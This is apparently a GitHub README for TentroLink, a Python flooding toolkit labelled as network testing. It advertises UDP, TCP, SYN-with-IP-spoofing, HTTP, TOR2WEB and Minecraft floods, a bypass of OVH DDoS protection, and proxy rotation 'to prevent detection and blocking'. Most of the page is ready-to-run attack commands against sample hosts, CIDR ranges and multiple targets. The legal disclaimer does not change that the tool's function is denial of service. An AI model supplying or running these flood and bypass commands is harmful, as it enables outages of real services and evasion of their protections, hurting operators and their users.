# TentroLink

<div align="center">

<img src="https://github.com/awiones/TentroLink/blob/main/assets/images/_Qbi9yCfTcG023xENbqkmA.jpg" alt="TentroLink Logo" width="250"/>

**Network Testing**

<p>  
  <a href="https://github.com/awiones/TentroLink">
    <img src="https://img.shields.io/badge/version-0.5-blue?style=for-the-badge">
  </a>  
  <a href="LICENSE">
    <img src="https://img.shields.io/badge/license-MIT-green?style=for-the-badge">
  </a>  
  <a href="https://www.python.org/">
    <img src="https://img.shields.io/badge/python-3.6+-yellow?style=for-the-badge&logo=python">
  </a>  
  <a href="https://github.com/awiones/TentroLink/blob/main/document.md">
    <img src="https://img.shields.io/badge/documentation-click%20here-lightgrey?style=for-the-badge">
  </a>  
</p>

</div>

## 📋 Overview

TentroLink is an advanced network testing toolkit designed for legitimate security testing and network resilience evaluation. It provides a comprehensive set of tools for assessing network infrastructure through various methodologies, helping security professionals identify and address potential vulnerabilities.

## ⚠️ Legal Disclaimer

> **IMPORTANT**: TentroLink is designed and should be used ONLY for authorized network testing, security research, and educational purposes. Usage of this tool against targets without explicit permission is illegal and unethical. The developers of TentroLink assume no liability and are not responsible for any misuse or damage caused by this tool.
>
> **You are responsible for your actions. Use this tool responsibly and legally.**
>
> > **NOTE: This project might be not work 100% while trying to flood since the high tech security from the server/website**

## 🛠️ Key Features

| Feature               | Description                                                          |
| --------------------- | -------------------------------------------------------------------- |
| 🔹 UDP Flooding       | DNS attack with payloads                                             |
| 🔹 TCP Flooding       | Connection handling with pool management                             |
| 🔹 HTTP Flooding      | HTTP/HTTPS flooding with custom payloads                             |
| 🔹 TOR2WEB Flooding   | Anonymous penetration testing                                        |
| 🔹 SYN Flooding       | TCP SYN packet flooding with IP spoofing                             |
| 🔹 Minecraft Flooding | Multi-protocol Minecraft server testing                              |
| 🔹 Layer 7 OVH Bypass | OVH-4 protection bypass with adaptive sizing (OVH-1,2,3 coming soon) |

> **NOTE: Some features like SYN flooding require root/administrator privileges for full capabilities**

## 🚀 Installation

### Step-by-Step Installation

```bash
# Clone the repository
git clone https://github.com/awiones/TentroLink.git

# Navigate to the TentroLink directory
cd TentroLink

# Install required packages
pip install -r requirements.txt

# Verify installation
python main.py --version
```

## 💻 Usage Guide

### Basic Syntax

```
python main.py [attack_method] -t [targets] [options]
```

### Available Testing Methods

| Method      | Description                                  | Default Port |
| ----------- | -------------------------------------------- | ------------ |
| `udp`       | UDP flood operation                          | 53           |
| `tcp`       | TCP flood operation with connection pooling  | 80           |
| `syn`       | SYN flood operation with IP spoofing support | 80           |
| `http`      | HTTP flood operation                         | 80           |
| `minecraft` | Minecraft server testing module              | 25565        |
| `ovh`       | Layer 7 OVH protection bypass                | 80           |

### Common Options

| Option            | Description                               | Default         |
| ----------------- | ----------------------------------------- | --------------- |
| `-t, --targets`   | Target specification (IP, domain, CIDR)   | _Required_      |
| `-p, --ports`     | Port specification (single, range, named) | Method-specific |
| `-d, --duration`  | Duration in seconds                       | 60              |
| `-T, --threads`   | Number of threads                         | Method-specific |
| `-v, --verbose`   | Enable verbose output                     | False           |
| `--no-color`      | Disable colored output                    | False           |
| `--proxy`         | Use proxies (file path or "auto")         | None            |
| `--proxy-threads` | Threads for proxy validation              | 10              |

### Quick Examples

```bash
# Basic UDP test
python main.py udp -t 192.168.1.1 -p 53 -d 30

# TCP test with multiple ports
python main.py tcp -t 192.168.1.1 -p 80,443 -d 60 -T 10

# SYN flood test with high thread count
python main.py syn -t example.com -p 80 -T 100 -d 60

# Test with automatic proxy acquisition
python main.py udp -t 192.168.1.1 --proxy auto
```

## 📊 Advanced Usage

### UDP Testing

```bash
# Basic UDP test with threads
python main.py udp -t 192.168.1.1 -p 53 -d 60 -T 5
```

### TCP Testing

```bash
# Testing multiple ports with increased threads
python main.py tcp -t 192.168.1.1 -p 80,443 -d 60 -T 10
```

### HTTP Testing

```bash
# Basic HTTP flood test
python main.py http -t example.com -p 80 --method GET -d 60 -T 10

# HTTP POST flood with increased threads
python main.py http -t example.com -p 80 --method POST -d 60 -T 20

# Custom path with HTTPS
python main.py http -t example.com -p 443 --method GET --path /api/v1/test
```

**Additional options:**

- `--method`: HTTP method to use (GET/POST/HEAD, default: GET)
- `--path`: Target URL path (default: /)

### Minecraft Testing

```bash
# Minecraft server testing
python main.py minecraft -t mc.example.com -p 25565 -T 10 -d 60
```

### OVH Bypass Testing

```bash
# OVH bypass with optimal configuration
python main.py ovh -t example.com -T 10 -d 60 --path /api/v1
```

> **Note**: Currently, only OVH-4 protection bypass is supported. Support for OVH-1, OVH-2, and OVH-3 will be added in future updates.

### Proxy Configuration

```bash
# Automatic proxy acquisition
python main.py udp -t 192.168.1.1 --proxy auto

# Using a proxy list file
python main.py udp -t 192.168.1.1 --proxy proxies.txt

# Adjusting proxy validation threads
python main.py udp -t 192.168.1.1 --proxy auto --proxy-threads 20
```

### Network Range Testing

```bash
# Testing a CIDR range
python main.py udp -t 192.168.1.0/24 -p 80-100 -d 120
```

### Multiple Targets

```bash
# Testing multiple specific targets
python main.py tcp -t 192.168.1.1,192.168.1.2 -p http,https -d 60 -T 20
```

### SYN Testing

```bash
# Basic SYN flood test
python main.py syn -t example.com -p 80 -d 60 -T 50

# Multi-port SYN flooding
python main.py syn -t example.com -p 80,443 -T 100 -d 120

# Skip target validation
python main.py syn -t example.com -p 80 -T 100 -y
```

> **Note**: The SYN flooding module is currently experiencing lower than expected BPS performance. This is being investigated for improvement in future updates.

## 📸 Screenshots

<div align="center">  
  <img src="assets/images/test%20stat.PNG" alt="Test Statistics" width="80%"/>  
  <p><em>Example of network test statistics output</em></p>

🎥 **Watch the Demo:**  
 <a href="https://youtu.be/t8iBKDLMi8Q" target="_blank">  
 <img src="https://img.youtube.com/vi/t8iBKDLMi8Q/maxresdefault.jpg" alt="YouTube Video Thumbnail" width="80%"/>  
 </a>

</div>

## 🔍 Technical Details

TentroLink employs multiple sophisticated mechanisms to test network resilience:

- **Dynamic payload generation** for maximizing test effectiveness
- **Intelligent thread management** to optimize resource utilization
- **Proxy rotation algorithms** to prevent detection and blocking
- **Real-time performance metrics** for comprehensive reporting

### Architecture

TentroLink uses a modular architecture consisting of:

1. **Core Engine** - Manages resources and coordinates testing operations
2. **Attack Modules** - Specialized implementations for different testing methodologies
3. **Proxy Manager** - Handles proxy acquisition, validation, and rotation
4. **Metrics Collector** - Gathers and displays real-time performance data

## 🤝 Contributing

We welcome contributions from the security research community! Here's how you can help:

1. **Report bugs**: Open an issue on our [issues page](https://github.com/awiones/TentroLink/issues)
2. **Feature requests**: Suggest new features or improvements
3. **Code contributions**: Submit pull requests with enhancements or fixes
4. **Documentation**: Help improve or translate documentation

Please read our [Contributing Guidelines](CONTRIBUTING.md) before submitting a pull request.

## 📜 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 📚 References

- [TCP/IP Protocol Suite RFC](https://www.rfc-editor.org/)
- [Python Socket Programming](https://docs.python.org/3/library/socket.html)

---

<div align="center">
  <strong>Remember: With great power comes great responsibility. Use TentroLink ethically and legally.</strong>
</div>
